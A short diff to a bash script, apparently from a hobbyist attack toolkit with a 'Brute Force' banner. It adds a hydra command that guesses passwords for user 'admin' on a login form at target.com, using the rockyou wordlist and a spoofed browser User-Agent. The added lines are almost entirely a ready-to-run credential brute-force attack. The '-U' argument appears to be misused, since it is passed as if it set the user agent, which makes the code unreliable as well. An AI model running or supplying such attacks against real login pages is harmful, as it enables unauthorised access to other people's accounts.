@@ -1,4 +1,10 @@
 #!/bin/bash
+UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+TARGET="http://target.com/login"
+
+log_activity "Brute Force Attempt" "Target: $TARGET, User-Agent: $UA" ""
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -s 80 -U "$UA"
 
 clear
 toilet -f pagga "Brute Force" | lolcat
